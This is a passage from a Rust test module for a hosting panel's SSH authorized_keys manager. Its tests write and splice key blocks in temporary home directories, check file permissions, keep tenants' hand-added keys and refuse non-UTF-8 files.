            ed25519_line(1, "x")
        );
        let err = read_block(&broken).unwrap_err();
        assert_eq!(err.code, ErrorCode::InvalidInput);
    }

    /// The file half, against a real home directory.
    ///
    /// Everything above tests the parsing and the splicing as pure functions.
    /// This drives the same code through [`FsRunner`] — the file manager's own
    /// helper — so what is proven is the whole path a key actually takes:
    /// create `~/.ssh`, write the file, set the modes sshd insists on, and read
    /// it back. `FsRunner::Local` is the dev/test variant of the same runner
    /// production uses (there is no privilege to drop when the test process
    /// owns the directory), so the request shapes are the production ones.
    async fn write_keys(home: &std::path::Path, existing: &str, keys: &[SshPublicKey]) {
        let target = Target {
            linux_user: LinuxUser::parse("ft_test").unwrap(),
            home: home.to_path_buf(),
            runner: FsRunner::Local,
        };
        // The block is rendered by the config engine's template set, the same
        // one the agent loads at startup.
        let templates = ferrum_config::TemplateSet::load().unwrap();
        let block = templates
            .render(
                "ssh/authorized_keys.block",
                &serde_json::json!({
                    "keys": keys.iter().map(|k| serde_json::json!({ "line": k.line() }))
                        .collect::<Vec<_>>(),
                }),
            )
            .unwrap();
        let updated = splice_block(existing, &block).unwrap();

        target
            .runner
            .call(
                &target.home,
                FsRequest::Mkdir {
                    path: PathBuf::from(SSH_DIR),
                },
                Vec::new(),
                FS_TIMEOUT,
            )
            .await
            .or_else(|e| {
                if e.code == ErrorCode::AlreadyExists {
                    Ok((FsData::Done, Vec::new()))
                } else {
                    Err(e)
                }
            })
            .unwrap();
        target.chmod(SSH_DIR, SSH_DIR_MODE).await.unwrap();

        let bytes = updated.into_bytes();
        target
            .runner
            .call(
                &target.home,
                FsRequest::Write {
                    path: PathBuf::from(AUTHORIZED_KEYS),
                    len: bytes.len() as u64,
                    create_parents: true,
                    append: false,
                },
                bytes,
                FS_TIMEOUT,
            )
            .await
            .unwrap();
        target
            .chmod(AUTHORIZED_KEYS, AUTHORIZED_KEYS_MODE)
            .await
            .unwrap();
    }

    #[tokio::test]
    async fn a_key_survives_a_round_trip_through_a_real_authorized_keys_file() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let home = std::fs::canonicalize(dir.path()).unwrap();
        let target = Target {
            linux_user: LinuxUser::parse("ft_test").unwrap(),
            home: home.clone(),
            runner: FsRunner::Local,
        };

        // Nothing there yet is the normal state for an account that has never
        // added a key — not an error.
        assert_eq!(target.read().await.unwrap(), "");

        let first = parse_authorized_key(&ed25519_line(1, "laptop")).unwrap();
        write_keys(&home, "", std::slice::from_ref(&first)).await;

        let back = target.read().await.unwrap();
        assert_eq!(read_block(&back).unwrap(), vec![first.clone()]);

        // sshd's StrictModes refuses anything more permissive than these, and a
        // key manager that installs a key nobody can log in with is worse than
        // one that refuses.
        let mode = |path: &str| {
            std::fs::metadata(home.join(path))
                .unwrap()
                .permissions()
                .mode()
                & 0o777
        };
        assert_eq!(mode(SSH_DIR), SSH_DIR_MODE);
        assert_eq!(mode(AUTHORIZED_KEYS), AUTHORIZED_KEYS_MODE);

        // A second key joins the block rather than replacing it.
        let second = parse_authorized_key(&ed25519_line(2, "phone")).unwrap();
        write_keys(&home, &back, &[first.clone(), second.clone()]).await;
        assert_eq!(read_block(&target.read().await.unwrap()).unwrap().len(), 2);

        // And removing one leaves the other alone.
        let after = target.read().await.unwrap();
        write_keys(&home, &after, std::slice::from_ref(&second)).await;
        assert_eq!(
            read_block(&target.read().await.unwrap()).unwrap(),
            vec![second]
        );
    }

    #[tokio::test]
    async fn a_key_the_tenant_added_by_hand_survives_the_panel_writing_the_file() {
        // Spec §10.4 rule 2, on a real file: the tenant put a key there over
        // SFTP before the panel existed, and it is not the panel's to delete.
        let dir = tempfile::tempdir().unwrap();
        let home = std::fs::canonicalize(dir.path()).unwrap();
        let target = Target {
            linux_user: LinuxUser::parse("ft_test").unwrap(),
            home: home.clone(),
            runner: FsRunner::Local,
        };

        let theirs = ed25519_line(9, "added-by-hand-over-sftp");
        std::fs::create_dir(home.join(SSH_DIR)).unwrap();
        std::fs::write(
            home.join(AUTHORIZED_KEYS),
            format!(
                "{theirs}
"
            ),
        )
        .unwrap();

        let existing = target.read().await.unwrap();
        let mine = parse_authorized_key(&ed25519_line(1, "panel")).unwrap();
        write_keys(&home, &existing, std::slice::from_ref(&mine)).await;

        let after = target.read().await.unwrap();
        assert!(
            after.contains(&theirs),
            "the tenant's own key was lost: {after}"
        );
        assert_eq!(read_block(&after).unwrap(), vec![mine]);
        assert!(has_keys_outside_block(&after).unwrap());

        // Removing the panel's last key removes the block and leaves theirs.
        write_keys(&home, &after, &[]).await;
        let emptied = target.read().await.unwrap();
        assert_eq!(
            emptied,
            format!(
                "{theirs}
"
            )
        );
    }

    #[tokio::test]
    async fn a_file_that_is_not_valid_utf8_is_refused_rather_than_rewritten() {
        // Rewriting it would replace whatever is there with a lossy version of
        // itself, which for an authorized_keys file means locking somebody out.
        let dir = tempfile::tempdir().unwrap();
        let home = std::fs::canonicalize(dir.path()).unwrap();
        std::fs::create_dir(home.join(SSH_DIR)).unwrap();
        std::fs::write(home.join(AUTHORIZED_KEYS), [0xff, 0xfe, 0x00, 0x01]).unwrap();

        let target = Target {
            linux_user: LinuxUser::parse("ft_test").unwrap(),
            home,
            runner: FsRunner::Local,
        };
        let err = target.read().await.unwrap_err();
        assert_eq!(err.code, ErrorCode::InvalidInput);
    }

    #[test]
    fn an_empty_file_gains_a_block_with_no_stray_blank_lines() {
        let out = splice_block("", &format!("{}\n", ed25519_line(1, "only"))).unwrap();
        assert!(out.starts_with(BEGIN_MARKER));
        assert!(out.ends_with(&format!("{END_MARKER}\n")));
        assert!(!out.contains("\n\n"));
        assert!(!has_keys_outside_block(&out).unwrap());
    }
}
